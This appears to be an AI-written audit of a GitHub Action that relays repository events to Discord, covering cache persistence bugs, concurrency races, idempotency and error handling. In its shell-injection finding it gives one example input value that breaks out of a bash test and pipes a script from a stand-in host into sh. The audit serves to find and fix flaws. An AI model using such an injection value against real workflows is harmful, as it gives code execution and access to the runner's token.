# Guardian's Audit: repo-relay Full Bug & Quality Audit

**Agent**: Guardian -- paranoid security/SRE who designs for 3am pages
**Overall Rating**: 3.1 / 5
**Date**: 2026-06-09

Scope: full read of `src/cli.ts`, `src/index.ts`, all of `src/handlers/`, `src/db/state.ts`, `src/discord/lookup.ts`, `src/github/reviews.ts`, `src/utils/*`, `src/pre-filter.ts`, `src/config/channels.ts`, `action.yml`, `src/setup/workflow-template.ts`, README persistence docs.

---

## Subsystem Ratings

### 1. CLI entry (`src/cli.ts`, process lifecycle) — 3/5
Good: strict env validation, pre-filter before burning a gateway session, top-level `main().catch` with sanitized output, session-limit retry with bounded wait (`src/index.ts:103-152`).

Faults:
- **`process.exit(1)` inside `catch` skips the `finally` block** (`src/cli.ts:97-102`). Node terminates immediately on `process.exit()`; `finally { await relay.disconnect() }` never runs on the error path. Consequence: no `wal_checkpoint(TRUNCATE)`, DB handle never closed, Discord client never destroyed. The DB survives via SQLite WAL recovery, but the one code path where you most want a clean checkpoint (a crashed run whose dirty WAL is about to be snapshotted by `actions/cache`'s post step) is exactly the path that skips it.
- **No watchdog on connect.** `connect()` resolves only on the `ready` event (`src/index.ts:112-115`). If login succeeds but `ready` never fires (gateway flap), the run hangs until the GitHub Actions 6-hour job timeout. A fire-once CLI should have a hard deadline (e.g., 60s) on becoming ready.
- `mapGitHubEvent()` is a set of blind `as` casts (`src/cli.ts:110-141`). A malformed/dispatch-injected payload (e.g., `workflow_run` without `pull_requests`) throws `TypeError` in `shouldSkipEvent` at `src/pre-filter.ts:18` (`prs.length` on undefined) — exit 1 with a generic message instead of a graceful skip.

### 2. Handlers (`src/handlers/*`) — 3/5
Good: stale-message recovery is implemented in `handlePrClosed` (`pr.ts:171-181`), `handlePrPush` (`pr.ts:212-226`), `handlePrUpdated` (`pr.ts:287-297`), CI (`ci.ts:111-119`), review (`review.ts:98-106`), comment (`comment.ts:109-117`), issue state changes (`issue.ts:138-147`). `withRetry` wraps Discord calls consistently. Comment handler smartly persists agent status *before* the Discord try block (`comment.ts:89-90`).

Faults:
- **`handlePrOpened` is not idempotent** (`pr.ts:115-139`): it unconditionally `channel.send()`s a new embed without checking `getExistingPrMessage`. Trigger: any re-run of a failed/flaky `opened` job (the project's own docs tell users to "configure secrets, then re-run"), GitHub webhook redelivery, or `reopened` after the closed-embed already exists. Consequence: duplicate embed + duplicate thread; DB upsert points to the new one and the old becomes a permanent orphan in the channel.
- **Stale-message detection matches on the string `'Unknown Message'`** (`pr.ts:174`, etc.) instead of `DiscordAPIError.code === 10008`. Brittle; any wording change silently converts recovery into a hard job failure.
- **CI handler clears but never recreates** (`ci.ts:113-115`): on stale message it deletes the row and `continue`s — that CI completion notification is dropped, embed only resurrects on the *next* PR event. Deviates from the documented clear-then-recreate pattern.
- Release/deployment/push/security handlers are stateless sends — fine, but a re-run duplicates those notifications too (no delivery-dedup keyed on `release.id`/`deployment.id` in `event_log`, which already exists and could serve this).

### 3. DB/state layer (`src/db/state.ts`) — 4/5
Good: `integrity_check` on open with full recreate of `db`/`-wal`/`-shm` on corruption (`state.ts:101-119`) — this is the right move for partially-restored caches. `wal_checkpoint(TRUNCATE)` on close (`state.ts:560-568`). Parameterized statements throughout. Migrations guarded for fresh DBs.

Faults:
- **`event_log` is unbounded and stores full event payloads** (`state.ts:522-533`). Every event appends full JSON. On a cached runner this grows the cache artifact forever (slower restores, eventual 10GB repo cache pressure/eviction — which then nukes *all* state). No pruning anywhere.
- Multi-statement writes (`savePrMessage` + `savePrData` + `savePrStatus`, `pr.ts:131-135`) are not wrapped in a transaction; a crash between them leaves a message row with no status row. Downstream code tolerates nulls, so this is low severity — but it's luck, not design.
- Integrity check is wholesale: any corruption deletes *everything* including recoverable tables. Acceptable given the Discord-search fallback, just note the blast radius.

### 4. Review detection (`src/github/reviews.ts`, piggyback + polling) — 4/5
Good: each API call independently try/caught with `safeErrorMessage` (`reviews.ts:94-96, 129-131`); per-PR poll failures don't abort the loop (`index.ts:458-464`); change detection is diffed against DB before posting.

Faults:
- The "changed" detection is only as good as the DB. With stale/frozen state (see Finding 1), `currentStatus.copilotStatus` reads `pending` on every run → `changed=true` every time → **duplicate "Copilot reviewed" thread posts on every subsequent event for the same PR**.
- `per_page=100` with no pagination: a PR with >100 issue comments can miss the agent-review comment entirely (silent false-negative, status stuck `pending`).
- Non-`ok` HTTP responses (403 rate limit, 401) are silently ignored — `if (reviewsRes.ok)` with no else (`reviews.ts:80, 103`). Rate-limited polling looks identical to "no reviews".

### 5. Error handling / sanitization (`src/utils/errors.ts`, catch blocks) — 4/5
Good: `safeErrorMessage` extracts `.message` only; I audited every non-test `catch` in `src/` — all log via `safeErrorMessage` or `error.message`, none dump raw error objects/stacks (where discord.js serialized request bodies could appear). Silent `catch {}` blocks (`index.ts:195, 434`; `pr.ts:399`; `issue.ts:197`; `state.ts:109, 563`) are all narrowly scoped with comments.

Faults:
- No `client.on('error')` handler on the Discord client; a gateway error event after connect on an EventEmitter with no listener crashes the process with the *raw* error printed by Node's default handler — bypassing all sanitization. Low probability in a 30-second run, but it's the one path where an unsanitized stack reaches Actions logs.
- The silent catch at `index.ts:434` ("thread might be archived or deleted") also swallows permission errors, masking real misconfiguration during review-update posts.

### 6. action.yml / cache integration — 2/5
Faults:
- **Shell injection via `${{ }}` interpolation into bash** (`action.yml`, "Validate inputs" step): `if ! [[ "${{ inputs.channel_prs }}" =~ ^[0-9]+$ ]]` and the error `echo` interpolate the raw input into the script body. A value like `x" ]]; then :; fi; curl evil.sh|sh; if [[ "1` executes arbitrary code in the consumer's runner with their `GITHUB_TOKEN` in env. Inputs come from the consumer's own secrets so the attacker must already control a secret or workflow — but this is the canonical GHA antipattern and trivially fixed with `env:` indirection.
- **The action and the setup-wizard workflow template ship with no cache step and no `concurrency` group** (`src/setup/workflow-template.ts:85-106`). Default GitHub-hosted install = zero persistence (everything rides on the 100-message channel search) and unlimited concurrent runs per repo.
- **The README's recommended cache snippet is broken** — see Finding 1.

---

## Top 5 Findings (worst first)

### F1 — Documented cache key freezes state at the first run forever (data integrity, critical)
`README.md:251-254` recommends:
```yaml
key: repo-relay-state-${{ github.repository }}
```
`actions/cache` entries are **immutable**: on an exact primary-key hit, the post-job save step is skipped ("cache hit occurred on the primary key, not saving"). Trigger sequence: run 1 misses → saves DB; run 2..N hit → restore run-1's snapshot, do work, **discard all writes**. Consequences: (a) every PR opened after run 1 is re-discovered via channel search every run, or duplicated once it scrolls past 100 messages; (b) `pr_status` perpetually reads `pending`, so the piggyback path posts duplicate "Copilot reviewed"/agent-review thread messages on *every* event for the same PR (`index.ts:400-437` fires whenever `checkForReviews` diffs against the frozen DB); (c) `getOpenPrNumbers` for scheduled polling sees only run-1's PRs. Fix: `key: repo-relay-state-${{ github.repository }}-${{ github.run_id }}` + `restore-keys: repo-relay-state-${{ github.repository }}-`, and put the corrected snippet into the setup wizard template, not just the README.

### F2 — No concurrency control: concurrent runs duplicate embeds/threads and lose writes (race, high)
There is no `concurrency:` group in the generated workflow and no cross-run locking. Concrete races, all traced:
- **Duplicate embed**: `pull_request synchronize` and `workflow_run completed` fire within seconds for the same PR with no DB entry (fresh cache). Both runs call `getExistingPrMessage` (`lookup.ts:55-90`), both miss DB *and* channel search (message not posted yet), both create embed + thread (`pr.ts:229-245`). Two embeds, two threads; whichever cache saves last wins the pointer.
- **Thread-creation crash**: two runs hold the same `messageId` with `threadId: null`; both call `getOrCreateThread` → second `message.startThread()` fails with `MessageExistingThread` (code 160004), which is not `'Unknown Message'` → rethrown → job fails red (`pr.ts:404-411`).
- **Lost status updates (last-cache-save-wins)**: even with a fixed per-run cache key, run A (CI success) and run B (synchronize) each restore the same parent snapshot, write disjoint fields, and save two sibling caches; the next run restores only one — the other run's `updateCiStatus` is gone, embed shows "running" indefinitely until the next event. Mitigation: footer-metadata recovery (`lookup.ts:74-85`) only triggers when the DB *row is missing*, not when it's stale — so it doesn't help here. Fix: `concurrency: { group: repo-relay-${{ github.repository }} }` (unqueued runs serialize) in the template, and treat 160004 as "fetch the existing thread instead".

### F3 — `handlePrOpened` is not idempotent: job re-runs duplicate PR embeds (medium-high)
`pr.ts:115-139` sends unconditionally. Trigger: the very common "first run failed (secrets missing / Discord 5xx after retries / session limit) → user clicks Re-run jobs" flow, or webhook redelivery. Consequence: a second embed + thread; the DB upsert (`state.ts:241-258`) silently abandons the first. All other PR paths check `getExistingPrMessage` first — `opened`/`reopened` should too (the lookup's channel-search even makes this nearly free).

### F4 — `process.exit(1)` in the CLI catch skips `finally`/`disconnect()` (medium)
`src/cli.ts:97-102`: on any handler error the process exits before `relay.disconnect()` runs, so no WAL checkpoint and no client teardown. The DB left behind has a dirty `-wal` that the cache post-step then snapshots; restore works only because the integrity check + WAL recovery in `state.ts:101-124` are solid — but if a future change caches `state.db` alone (without `-wal`/`-shm`), every failed run silently loses its committed-to-WAL writes. Fix: set an exit code variable in the catch and `process.exit(code)` *after* the finally, or `process.exitCode = 1` and return.

### F5 — `action.yml` interpolates inputs directly into bash (security, medium)
The "Validate inputs" step embeds `${{ inputs.discord_bot_token }}` (empty-check) and `${{ inputs.channel_prs }}` (regex + echo) into the script text. Anyone who can influence those inputs (compromised secret, repo collaborator editing the calling workflow with a literal value) gets command execution with the job's `GITHUB_TOKEN`. Fix: pass inputs via `env:` and reference `"$CHANNEL_PRS"` in the script — same validation, zero injection surface.

Honorable mentions: string-match on `'Unknown Message'` instead of error code 10008 (all handlers); unbounded `event_log` with full payloads bloating the cache artifact (`state.ts:522-533`); silently ignored non-OK GitHub API responses in `reviews.ts:80,103`; no `client.on('error')` listener (raw-stack crash path); no pagination on review/comment fetches; 100-message channel-search window means long-lived PRs in busy channels duplicate after cache loss.

---

## Recommendations (priority order)
1. Fix the cache recipe: unique `key` + `restore-keys` prefix; embed it in `workflow-template.ts` and the README, with `concurrency: repo-relay-${{ github.repository }}` on the job.
2. Make `handlePrOpened` check `getExistingPrMessage` first; on hit, edit instead of send.
3. Handle Discord error codes, not strings: `error.code === 10008` for stale messages; `160004` in `getOrCreateThread` → fetch `message.thread` instead of failing.
4. Replace `process.exit(1)` in the cli catch with `process.exitCode = 1` so `finally`/checkpoint always runs; add a 60s ready-timeout in `connect()` and a `client.on('error', ...)` sanitized logger.
5. Move `action.yml` input validation to `env:`-passed variables; prune `event_log` (e.g., `DELETE WHERE created_at < datetime('now','-30 days')` on open) or stop storing full payloads.
6. Extend footer-metadata recovery to reconcile *stale* rows (compare embed footer vs DB on every fetch), not just missing rows — it's the only defense against lost cache writes.

---

## Verdict
repo-relay is a well-built personal tool with genuinely good instincts — the integrity-check-and-recreate on open, WAL checkpoint on close, Discord channel-search fallback, and footer-metadata recovery show the author understood that the cache makes state untrustworthy. But it is not yet a production dependency: the *documented* persistence recipe (static cache key) means state is frozen after the first run and the duplicate-notification/stale-status symptoms that follow are guaranteed, not theoretical; there is no concurrency control, so the most common real-world sequence (push + CI completing together) can duplicate embeds or fail jobs outright; and the happy-path-only idempotency of `handlePrOpened` turns every job re-run into channel spam. All five top findings are cheap to fix (a cache key, a concurrency line, one lookup call, an exit-code change, an `env:` block) — fix those before chroxy takes a dependency, and this moves to a 4.
